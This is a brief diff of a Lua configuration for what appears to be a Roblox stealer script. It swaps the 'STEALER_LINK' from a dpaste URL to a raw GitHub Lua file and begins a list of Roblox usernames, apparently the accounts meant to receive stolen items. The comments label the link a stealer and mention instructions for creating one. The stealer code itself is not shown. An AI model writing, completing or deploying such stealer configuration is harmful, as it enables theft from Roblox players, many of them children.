@@ -1,4 +1,4 @@
-STEALER_LINK = 'https://dpaste.com/HB7SYM2PU.txt' -- stealer link (how to create is bellow)
+STEALER_LINK = 'https://raw.githubusercontent.com/XybH4/miaw/refs/heads/main/Shush.lua' -- stealer link (how to create is bellow)
 
 Usernames = {
     'JamesCounterXyb', -- PUT UR ROBLOX USERNAMES
